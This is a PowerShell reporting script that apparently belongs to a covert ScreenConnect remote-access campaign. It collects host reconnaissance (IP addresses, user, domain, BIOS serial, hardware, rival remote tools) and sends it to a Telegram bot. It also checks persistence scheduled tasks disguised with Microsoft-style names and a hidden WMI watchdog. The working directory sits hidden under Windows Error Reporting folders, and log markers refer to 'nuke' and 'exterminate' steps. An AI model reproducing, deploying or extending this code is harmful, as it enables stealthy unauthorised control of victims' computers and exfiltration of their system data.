#Requires -Version 5.1
# TG_REPORT BUILD 20260802T9 - identity-aware tasks + compact digest mode; -Force on hidden cache; wider marker filter
param(
    [Parameter(Mandatory = $true)][string]$State,
    [string]$Summary = '',
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$OldState = '',
    [ValidateSet('rich', 'compact')][string]$Mode = 'rich',
    [string]$Build = 'O15',
    [string]$Count = '0'
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Get-Cfg {
    $path = Join-Path $WorkDir 'notify.cfg'
    $cfg = @{}
    if (-not (Test-Path $path)) { return $cfg }
    Get-Content -LiteralPath $path | ForEach-Object {
        if ($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$') {
            $cfg[$matches[1]] = $matches[2].Trim()
        }
    }
    return $cfg
}

function Esc([string]$s) {
    if ($null -eq $s) { return '' }
    return ($s -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;')
}

function Get-PublicIp {
    foreach ($u in @(
            'https://api.ipify.org',
            'https://ifconfig.me/ip',
            'https://icanhazip.com'
        )) {
        try {
            $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 6
            $ip = ($r.Content | Out-String).Trim()
            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$' -or $ip -match ':') { return $ip }
        } catch {}
    }
    return 'n/a'
}

function Get-LocalIps {
    try {
        $ips = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -ne 'WellKnown' } |
            Select-Object -ExpandProperty IPAddress -Unique
        if ($ips) { return ($ips -join ', ') }
    } catch {}
    try {
        $ips = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' |
            ForEach-Object { $_.IPAddress } | Where-Object { $_ -and $_ -notlike '127.*' -and $_ -notlike '*:*' }
        if ($ips) { return (($ips | Select-Object -Unique) -join ', ') }
    } catch {}
    return 'n/a'
}

function Get-OsInfo {
    $o = [ordered]@{
        Caption = 'n/a'; Version = 'n/a'; Build = 'n/a'; Arch = 'n/a'
        Domain = 'n/a'; InstallDate = 'n/a'; LastBoot = 'n/a'
        CPU = 'n/a'; Manufacturer = 'n/a'; Model = 'n/a'; Serial = 'n/a'
        TotalRAM_GB = 'n/a'; DiskFree_GB = 'n/a'; DiskSize_GB = 'n/a'
    }
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $o.Caption = $os.Caption
        $o.Version = $os.Version
        $o.Build = $os.BuildNumber
        $o.Arch = $os.OSArchitecture
        $o.InstallDate = ($os.InstallDate | Get-Date -Format 'yyyy-MM-dd')
        $o.LastBoot = ($os.LastBootUpTime | Get-Date -Format 'yyyy-MM-dd HH:mm')
        $o.TotalRAM_GB = [math]::Round($os.TotalVisibleMemorySize / 1MB, 1)
    } catch {}
    try {
        $cs = Get-CimInstance Win32_ComputerSystem
        $o.Domain = if ($cs.PartOfDomain) { $cs.Domain } else { $cs.Workgroup }
        $o.Manufacturer = $cs.Manufacturer
        $o.Model = $cs.Model
    } catch {}
    try {
        $o.CPU = (Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)
    } catch {}
    try {
        $o.Serial = (Get-CimInstance Win32_BIOS).SerialNumber
    } catch {}
    try {
        $d = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
        $o.DiskFree_GB = [math]::Round($d.FreeSpace / 1GB, 1)
        $o.DiskSize_GB = [math]::Round($d.Size / 1GB, 1)
    } catch {}
    return $o
}

function Get-SvcLine([string]$name) {
    $s = Get-Service -Name $name -ErrorAction SilentlyContinue
    if (-not $s) { return 'NOT INSTALLED' }
    return ('{0} (Start={1})' -f $s.Status, $s.StartType)
}

function Get-TaskHealth([string]$tn) {
    $out = & schtasks.exe /Query /TN $tn /FO LIST /V 2>$null
    if ($LASTEXITCODE -ne 0 -or -not $out) {
        return @{ Present = $false; Status = 'MISSING'; Next = ''; Last = ''; Result = '' }
    }
    $map = @{}
    foreach ($line in $out) {
        if ($line -match '^\s*([^:]+):\s*(.*)\s*$') {
            $map[$matches[1].Trim()] = $matches[2].Trim()
        }
    }
    $status = $map['Status']
    if (-not $status) { $status = $map['Task Status'] }
    if (-not $status) { $status = 'present' }
    $next = $map['Next Run Time']
    if (-not $next) { $next = '' }
    $last = $map['Last Run Time']
    if (-not $last) { $last = '' }
    $result = $map['Last Result']
    if (-not $result) { $result = '' }
    $healthy = ($status -match 'Ready|Running') -or ($status -eq 'present')
    return @{
        Present = $true
        Healthy = [bool]$healthy
        Status  = $status
        Next    = $next
        Last    = $last
        Result  = $result
    }
}

function Get-RmmHits {
    $tokens = @(
        'AnyDesk', 'TeamViewer', 'tvnserver', 'DWAgent', 'DWService', 'LogMeIn', 'LMIGuardian',
        'WinVNC', 'vncserver', 'tv_', 'Splashtop', 'Zoho', 'RustDesk', 'RemotePC', 'DameWare',
        'AteraAgent', 'Atera', 'NinjaRMM', 'NinjaOne', 'Ninja', 'Kaseya', 'Pulseway', 'Syncro',
        'SuperOps', 'ManageEngine', 'SolarWinds', 'ConnectWise', 'LTService', 'LabTech',
        'Action1', 'SimpleHelp', 'Bomgar', 'BeyondTrust', 'MeshAgent', 'Mesh Central',
        'TacticalRMM', 'tacticalrmm',         'GetScreen', 'Supremo', 'rutserv', 'remoting_host',
        'Chrome Remote Desktop', 'Parsec', 'NetSupport', 'Level.io', 'Level Agent',
        'Datto RMM', 'Continuum'
    )
    $hits = New-Object System.Collections.Generic.List[string]
    $seen = @{}

    function Add-Hit([string]$kind, [string]$name) {
        $key = "$kind|$name".ToLowerInvariant()
        if ($seen.ContainsKey($key)) { return }
        $seen[$key] = $true
        [void]$hits.Add(('- [{0}] <code>{1}</code>' -f $kind, (Esc $name)))
    }

    Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
        $n = $_.Name
        $d = $_.DisplayName
        if ($n -like 'ScreenConnect Client*') { return }
        foreach ($t in $tokens) {
            if ($n -like "*$t*" -or $d -like "*$t*") {
                Add-Hit 'svc' ("$n ($($_.Status))")
                break
            }
        }
    }

    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
        $n = $_.ProcessName
        if ($n -like '*ScreenConnect*') { return }
        foreach ($t in $tokens) {
            if ($n -like "*$t*") {
                Add-Hit 'proc' $n
                break
            }
        }
    }

    $uninst = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    foreach ($path in $uninst) {
        Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = [string]$_.DisplayName
            if (-not $dn) { return }
            if ($dn -like '*ScreenConnect*') { return }
            foreach ($t in $tokens) {
                if ($dn -like "*$t*") {
                    Add-Hit 'msi' $dn
                    break
                }
            }
        }
    }

    return $hits
}

function Get-ScInstalls {
    $list = New-Object System.Collections.Generic.List[string]
    Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
        $fp = if ($_.Name -match '\(([0-9a-f]{16})\)') { $matches[1] } else { '?' }
        $tag = if ($fp -eq '5f6010579852e507') { 'KEEP-PRIMARY' }
        elseif ($fp -eq 'f861c8140d453427') { 'KEEP-ALT' }
        else { 'FOREIGN' }
        [void]$list.Add(('- <code>{0}</code>: <b>{1}</b> [{2}]' -f (Esc $_.Name), (Esc ([string]$_.Status)), $tag))
    }

    $roots = @(
        "${env:ProgramFiles}\ScreenConnect Client*",
        "${env:ProgramFiles(x86)}\ScreenConnect Client*"
    )
    foreach ($pat in $roots) {
        Get-ChildItem -Path $pat -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            [void]$list.Add(('- path: <code>{0}</code>' -f (Esc $_.FullName)))
        }
    }

    $uninst = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    foreach ($path in $uninst) {
        Get-ItemProperty $path -ErrorAction SilentlyContinue | Where-Object {
            $_.DisplayName -like '*ScreenConnect*'
        } | ForEach-Object {
            $ver = if ($_.DisplayVersion) { $_.DisplayVersion } else { '?' }
            [void]$list.Add(('- msi: <code>{0}</code> v{1}' -f (Esc $_.DisplayName), (Esc $ver)))
        }
    }

    if ($list.Count -eq 0) { [void]$list.Add('- (none)') }
    return $list
}

$cfg = Get-Cfg
if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) {
    Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value 'tg_skip_no_cfg' -ErrorAction SilentlyContinue
    exit 2
}

$prim = 'ScreenConnect Client (5f6010579852e507)'
$alt = 'ScreenConnect Client (f861c8140d453427)'
$os = Get-OsInfo
$who = [Security.Principal.WindowsIdentity]::GetCurrent().Name
$elev = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
$isSystem = $who -like '*SYSTEM*' -or $who -eq 'NT AUTHORITY\SYSTEM'

$msiCache = Join-Path $WorkDir 'pkg.msi'
$msiSize = if (Test-Path $msiCache) {
    '{0:N0} KB' -f ((Get-Item $msiCache -Force).Length / 1KB)
} else { 'none' }

$monPath = Join-Path $WorkDir 'own_mon.cmd'
$etlMon = "$env:ProgramData\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"
$hasMon = Test-Path $monPath
$hasEtl = Test-Path $etlMon

# per-host identity: expected task names come from identity.cfg when present
$idCfg = Join-Path $WorkDir 'identity.cfg'
$idMap = @{}
if (Test-Path $idCfg) {
    Get-Content -LiteralPath $idCfg | ForEach-Object {
        if ($_ -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $idMap[$matches[1]] = $matches[2] }
    }
}
$expectedTasks = @(
    @{ Name = $(if ($idMap.TASK_A) { $idMap.TASK_A } else { '\Microsoft\Windows\Diagnosis\Scheduled' }); Role = "tick $($idMap.MO_A)m (chain1)" },
    @{ Name = $(if ($idMap.TASK_B) { $idMap.TASK_B } else { '\Microsoft\Windows\PLA\Server' }); Role = "backup $($idMap.MO_B)m (chain1)" },
    @{ Name = $(if ($idMap.TASK_C) { $idMap.TASK_C } else { '\Microsoft\Windows\WDI\ResolutionHost' }); Role = 'ONSTART (chain1)' },
    @{ Name = $(if ($idMap.TASK_D) { $idMap.TASK_D } else { '\Microsoft\Windows\Tcpip\IpAddressConflict1' }); Role = 'ONLOGON (chain1)' }
)
# chain 2: WMI watchdog subscription
$wmiC = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
$expectedTasks += @{ Name = '\WMI\WucacheWatchdogC'; Role = 'timer 3m (chain2)'; Wmi = ($null -ne $wmiC) }

$taskLines = New-Object System.Collections.Generic.List[string]
$taskOk = 0
$taskBad = 0
foreach ($t in $expectedTasks) {
    if ($t.ContainsKey('Wmi')) {
        if ($t.Wmi) { $taskOk++; $mark = 'OK' } else { $taskBad++; $mark = 'MISSING' }
        [void]$taskLines.Add(('- [{0}] <code>{1}</code> - {2}' -f $mark, (Esc $t.Name), (Esc $t.Role)))
        continue
    }
    $h = Get-TaskHealth $t.Name
    if ($h.Present -and $h.Healthy) {
        $taskOk++
        $mark = 'OK'
    } elseif ($h.Present) {
        $taskBad++
        $mark = 'WEAK'
    } else {
        $taskBad++
        $mark = 'MISSING'
    }
    $extra = ''
    if ($h.Present) {
        $bits = @()
        if ($h.Status) { $bits += $h.Status }
        if ($h.Result -ne '' -and $h.Result -ne '0') { $bits += ("LastResult=" + $h.Result) }
        if ($bits.Count) { $extra = ' (' + ($bits -join ', ') + ')' }
    }
    [void]$taskLines.Add(('- [{0}] <code>{1}</code> - {2}{3}' -f $mark, (Esc $t.Name), (Esc $t.Role), (Esc $extra)))
}

$primLine = Get-SvcLine $prim
$altLine = Get-SvcLine $alt
$primOk = $primLine -like 'Running*'
$deployOk = $primOk -and ($taskOk -ge 3) -and $hasMon

$emojiMap = @{
    OK       = [string]([char]0x2705)
    DOWN     = ([string][char]::ConvertFromUtf32(0x1F6A8))
    RESTORED = ([string][char]::ConvertFromUtf32(0x1F7E2))
    FAIL     = [string]([char]0x274C)
    FORCE    = [string]([char]0x26A1)
    DEPLOY   = ([string][char]::ConvertFromUtf32(0x1F680))
    HB       = ([string][char]::ConvertFromUtf32(0x1F4E1))
}
$key = $State.ToUpperInvariant()
$emoji = if ($emojiMap.ContainsKey($key)) { $emojiMap[$key] } else { ([string][char]::ConvertFromUtf32(0x1F4F1)) }

$title = switch ($key) {
    'OK' { 'Primary healthy' }
    'DOWN' { 'Primary DOWN - healing' }
    'RESTORED' { 'Primary RESTORED' }
    'FAIL' { 'Heal FAILED' }
    'FORCE' { 'Forced reinstall' }
    'DEPLOY' { if ($deployOk) { 'FIRST DEPLOY OK' } else { 'FIRST DEPLOY - CHECK NEEDED' } }
    'HB' { 'hourly digest' }
    default { "State: $State" }
}

$trans = if ($OldState) { "$OldState -> $State" } else { $State }
$scList = Get-ScInstalls
$rmmHits = Get-RmmHits
if ($rmmHits.Count -eq 0) { [void]$rmmHits.Add('- (none detected)') }

$pub = Get-PublicIp
$lan = Get-LocalIps
$now = Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz'
$uptime = 'n/a'
try {
    $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $uptime = '{0:dd}d {0:hh}h {0:mm}m' -f ((Get-Date) - $boot)
} catch {}

# campaign state file (written by own_lib.ps1 state action)
$stateLine = 'n/a'
$stateObj = $null
$statePath2 = Join-Path $WorkDir 'state.json'
if (Test-Path $statePath2) {
    $rawState = (Get-Content -LiteralPath $statePath2 -Raw).Trim()
    try {
        $stateObj = $rawState | ConvertFrom-Json
        $foreignCsv = if ($stateObj.foreign) { ($stateObj.foreign -join ',') } else { '-' }
        $stateLine = "prim=$($stateObj.prim) alt=$($stateObj.alt) foreign=[$foreignCsv] tasks=$($stateObj.tasksOk)/$($stateObj.tasksTotal) wd=$($stateObj.watchdog) heals=$($stateObj.installCount)"
    } catch { $stateLine = $rawState }
}

$deployBlock = ''
if ($key -eq 'DEPLOY') {
    $verdict = if ($deployOk) { 'DEPLOYED / HEALTHY' } else { 'DEPLOYED BUT INCOMPLETE' }
    $foreign = @(Get-ChildItem -Path "${env:ProgramFiles}\ScreenConnect Client*","${env:ProgramFiles(x86)}\ScreenConnect Client*" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notmatch '5f6010579852e507|f861c8140d453427' })
    $diagLines = New-Object System.Collections.Generic.List[string]
    $bootPath = Join-Path $WorkDir 'boot.err'
    if (Test-Path $bootPath) {
        $interesting = @(
            'msi_', 'fetch_', 'primary_', 'nuke_', 'msi_too', 'msi_fetch', 'msi_exit',
            'msi_unavailable', 'secure_', 'go_', 'exterminate_', 'identity_',
            'create_task', 'verify_task', 'orphan_', 'stale_', 'postinstall', 'alt_'
        )
        Get-Content -LiteralPath $bootPath -ErrorAction SilentlyContinue |
            Where-Object {
                $line = $_
                foreach ($t in $interesting) { if ($line -like "*$t*") { return $true } }
                $false
            } |
            Select-Object -Last 26 |
            ForEach-Object { [void]$diagLines.Add(('- <code>{0}</code>' -f (Esc ($_ -replace '[^\x20-\x7E]', '?')))) }
    }
    if ($diagLines.Count -eq 0) { [void]$diagLines.Add('- (no install/nuke markers in boot.err)') }
    $deployBlock = @"

<b>Deploy verdict</b>
- Result: <b>$(Esc $verdict)</b>
- Primary Running: $(if ($primOk) { 'YES' } else { 'NO' })
- Monitor script (.wucache\own_mon.cmd): $(if ($hasMon) { 'YES' } else { 'NO' })
- Backup mon (.etlcache\etl_mon.cmd): $(if ($hasEtl) { 'YES' } else { 'NO' })
- Persist tasks OK: $taskOk / $($expectedTasks.Count) (bad/missing: $taskBad)
- MSI cache: $(Esc $msiSize)
- Foreign SC folders left: $($foreign.Count)
- Note: LastResult 267011 = task not yet run (normal right after create)

<b>Deploy log markers</b>
$($diagLines -join "`n")
"@
}

$text = @"
$emoji <b>SC Monitor - $(Esc $title)</b>

<b>Event</b>
- Summary: $(Esc $Summary)
- Transition: <code>$(Esc $trans)</code>
- When: $(Esc $now)
$deployBlock

<b>Host</b>
- Computer: <code>$(Esc $env:COMPUTERNAME)</code>
- User: <code>$(Esc $who)</code>
- Elevated: $elev | SYSTEM: $isSystem
- Domain/Workgroup: $(Esc $os.Domain)

<b>Network</b>
- LAN IPs: <code>$(Esc $lan)</code>
- Public IP: <code>$(Esc $pub)</code>

<b>OS / Hardware</b>
- OS: $(Esc $os.Caption)
- Version: $(Esc $os.Version) (build $(Esc $os.Build)) $(Esc $os.Arch)
- Install: $(Esc $os.InstallDate) | Last boot: $(Esc $os.LastBoot)
- Uptime: $(Esc $uptime)
- CPU: $(Esc $os.CPU)
- Hardware: $(Esc $os.Manufacturer) $(Esc $os.Model)
- Serial: <code>$(Esc $os.Serial)</code>
- RAM: $($os.TotalRAM_GB) GB
- Disk C: $($os.DiskFree_GB) GB free / $($os.DiskSize_GB) GB

<b>ScreenConnect (all)</b>
- Primary <code>5f6010579852e507</code>: $(Esc $primLine)
- Alt <code>f861c8140d453427</code>: $(Esc $altLine)
$($scList -join "`n")

<b>Other RMM / remote tools</b>
$($rmmHits -join "`n")

<b>Persist tasks (expected)</b>
$($taskLines -join "`n")

<b>Cache</b>
- MSI cache: $(Esc $msiSize)
- WorkDir: <code>$(Esc $WorkDir)</code>

<b>Campaign state</b>
- <code>$(Esc $stateLine)</code>

<i>Bot: @nobuddyrmmBot | TG_REPORT T8</i>
"@

# compact digest mode: one short line, HTML-free (hourly heartbeat)
if ($Mode -eq 'compact') {
    $foreignN = 0
    if ($stateObj -and $stateObj.foreign) { $foreignN = @($stateObj.foreign).Count }
    $msiShort = if (Test-Path $msiCache) { '{0:N0}KB' -f ((Get-Item $msiCache -Force).Length / 1KB) } else { '0' }
    $primShort = if ($primOk) { 'OK' } else { 'DOWN' }
    $altShort = if ($altLine -like 'Running*') { 'OK' } else { '-' }
    $text = "$emoji SCD|$($env:COMPUTERNAME)|prim=$primShort|alt=$altShort|foreign=$foreignN|tasks=$taskOk/5|msi=$msiShort|up=$uptime|b=$Build|$now"
}

if ($text.Length -gt 3800) {
    $rmmHits = @(($rmmHits | Select-Object -First 12)) + ('- ... ({0} more)' -f ($rmmHits.Count - 12))
    $scList = @(($scList | Select-Object -First 14)) + ('- ... ({0} more)' -f ($scList.Count - 14))
    $text = $text.Substring(0, 3800) + "`n`n<i>TRUNCATED (Telegram 4096 limit)</i>"
}

$log = Join-Path $WorkDir 'boot.err'
function Send-Tg([string]$msg, [string]$mode) {
    $payload = @{
        chat_id                  = $cfg.CHAT_ID
        text                     = $msg
        disable_web_page_preview = $true
    }
    if ($mode) { $payload.parse_mode = $mode }
    $json = $payload | ConvertTo-Json -Compress -Depth 5
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") `
        -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' | Out-Null
}

function Send-TgSafe([string]$msg, [string]$mode) {
    $toSend = $msg
    try {
        Send-Tg -msg $toSend -mode $mode
        return $true
    } catch {
        try {
            Send-Tg -msg ($toSend.Substring(0, 3000) + "`n<i>TRUNCATED</i>") -mode $mode
            return $true
        } catch {
            return $false
        }
    }
}

try {
    if (Send-TgSafe -msg $text -mode 'HTML') {
        Add-Content -LiteralPath $log -Value 'tg_sent_rich' -ErrorAction SilentlyContinue
    } else {
        throw 'html_failed'
    }
    if ($key -eq 'DEPLOY') {
        Add-Content -LiteralPath $log -Value ("tg_deploy_ok=" + $deployOk) -ErrorAction SilentlyContinue
        Set-Content -LiteralPath (Join-Path $WorkDir 'deploy_tg.flag') -Value (Get-Date -Format 'o') -ErrorAction SilentlyContinue
    }
} catch {
    try {
        $plain = [regex]::Replace($text, '<[^>]+>', '')
        $plain = [System.Net.WebUtility]::HtmlDecode($plain)
        if ($plain.Length -gt 3500) { $plain = $plain.Substring(0, 3500) + "`nTRUNCATED" }
        Send-TgSafe -msg $plain -mode '' | Out-Null
        Add-Content -LiteralPath $log -Value 'tg_sent_plain' -ErrorAction SilentlyContinue
    } catch {
        Add-Content -LiteralPath $log -Value ("tg_fail " + $_.Exception.Message) -ErrorAction SilentlyContinue
    }
}
